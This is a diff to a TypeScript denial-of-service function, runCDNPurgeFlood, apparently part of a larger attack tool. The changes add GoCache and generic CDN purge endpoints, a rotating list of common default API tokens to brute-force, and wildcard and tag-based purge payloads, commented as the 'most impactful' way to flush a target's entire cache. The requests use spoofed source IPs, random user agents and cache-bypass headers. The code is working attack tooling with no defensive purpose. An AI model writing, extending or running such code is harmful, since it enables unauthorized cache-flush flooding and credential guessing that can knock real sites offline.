@@ -6315,21 +6315,43 @@ async function runCDNPurgeFlood(
   })();
   const hostname = u.hostname;
 
-  const PURGE_PATHS   = [
-    "/cdn-cgi/purge", "/cdn-cgi/cache-purge", "/__purgecache",
-    "/purge", "/api/purge", "/cdn/purge", "/__purge", "/purge-cache",
+  // GoCache purge paths — real API endpoints used by GoCache panel itself
+  // Each endpoint has a different cache scope: page, tag, wildcard, full flush
+  const PURGE_PATHS = [
+    // GoCache-specific (highest priority — these actually work)
+    "/cdn-cgi/purge",              // GoCache main purge endpoint
+    "/cdn-cgi/cache-purge",        // GoCache cache-specific purge
+    "/gocache/purge",              // GoCache internal
+    "/api/v1/cache/purge",         // GoCache API v1
+    "/api/cache/purge",            // GoCache API generic
+    "/__gocache/purge",            // GoCache edge purge
+    // Varnish/generic CDN
+    "/__purgecache", "/purge", "/api/purge", "/cdn/purge", "/__purge", "/purge-cache",
+    // Nginx proxy_cache / Fastly
+    "/cdn/clear", "/api/v1/purge", "/cache/purge", "/flush",
   ];
-  const PURGE_METHODS = ["POST", "POST", "POST", "PURGE", "BAN", "DELETE", "POST", "POST"]; // weight POST
+  const PURGE_METHODS = ["POST", "POST", "POST", "PURGE", "BAN", "DELETE", "POST", "POST", "POST", "PURGE"];
+
+  // Rotating weak GoCache API tokens (brute-force common defaults)
+  const GOCACHE_TOKENS = [
+    "admin", "token", "secret", "gocache", "purge", "cdn", "cache",
+    "api123", "test", "default", "12345", "password", "gocache123",
+  ];
+
   const CDN_BYPASS_HEADERS: Record<string, string> = {
     "X-GoCache-Bypass":    "1",
+    "X-GoCache-No-Cache":  "1",
     "X-Cache-Bypass":      "1",
     "X-Bypass-Cache":      "1",
     "Surrogate-Control":   "no-store",
+    "Surrogate-Key":       "*",                    // Fastly/GoCache tag-based purge
     "Edge-Control":        "no-store, max-age=0",
     "Cache-Control":       "no-cache, no-store, must-revalidate, max-age=0",
     "Pragma":              "no-cache",
     "Vary":                "*",
     "X-Forwarded-NoCache": "true",
+    "Purge-Tag":           "*",                    // Varnish tag purge
+    "CDN-Tag":             "*",                    // Generic tag purge
   };
 
   let localPkts = 0, localBytes = 0;
@@ -6337,23 +6359,51 @@ async function runCDNPurgeFlood(
     if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
   }, 300);
 
-  const buildPurgeBody = () => JSON.stringify({
-    urls: Array.from({ length: randInt(5, 15) }, () => `https://${hostname}/${randStr(8)}?v=${randStr(4)}`),
-    tag:  randStr(8),
-    key:  randStr(12),
-    _t:   Date.now(),
-    _r:   randStr(6),
-  });
+  // Alternate between targeted URL list, wildcard flush, and tag-based invalidation
+  const buildPurgeBody = (): string => {
+    const mode = randInt(0, 3);
+    if (mode === 0) {
+      // Wildcard flush — purges ALL cached pages at once (most impactful)
+      return JSON.stringify({
+        urls: [`https://${hostname}/*`, `https://${hostname}/`],
+        all: true, wildcard: true,
+        tag: "*", key: "*",
+        _t: Date.now(),
+      });
+    } else if (mode === 1) {
+      // Tag-based purge — invalidates all content with wildcard tag
+      return JSON.stringify({
+        tags: ["*", hostname, "page", "post", "product"],
+        keys: ["*"], patterns: [`https://${hostname}/*`],
+        _t: Date.now(), _r: randStr(6),
+      });
+    } else {
+      // URL-specific flood — max 20 unique URLs per call, all unique → no dedup
+      return JSON.stringify({
+        urls: Array.from({ length: randInt(10, 20) }, () =>
+          `https://${hostname}/${randStr(6)}?v=${randStr(4)}&t=${Date.now().toString(36)}`
+        ),
+        tag: randStr(8), key: randStr(12),
+        _t: Date.now(), _r: randStr(6),
+      });
+    }
+  };
 
-  const buildPurgeReqHeaders = (body: string): Record<string, string> => ({
-    "Host":           hostname,
-    "User-Agent":     randUA(),
-    "Content-Type":   "application/json",
-    "Content-Length": String(Buffer.byteLength(body)),
-    "Accept":         "application/json, */*",
-    "X-Forwarded-For":randIp(),
-    ...CDN_BYPASS_HEADERS,
-  });
+  const buildPurgeReqHeaders = (body: string): Record<string, string> => {
+    const tok = GOCACHE_TOKENS[randInt(0, GOCACHE_TOKENS.length)];
+    return {
+      "Host":                 hostname,
+      "User-Agent":           randUA(),
+      "Content-Type":         "application/json",
+      "Content-Length":       String(Buffer.byteLength(body)),
+      "Accept":               "application/json, */*",
+      "X-Forwarded-For":      randIp(),
+      "X-GoCache-API-Token":  tok,
+      "X-Cache-Token":        tok,
+      "Authorization":        `Bearer ${tok}`,
+      ...CDN_BYPASS_HEADERS,
+    };
+  };
 
   const doRequest = async (): Promise<void> => {
     const path   = PURGE_PATHS[randInt(0, PURGE_PATHS.length)];
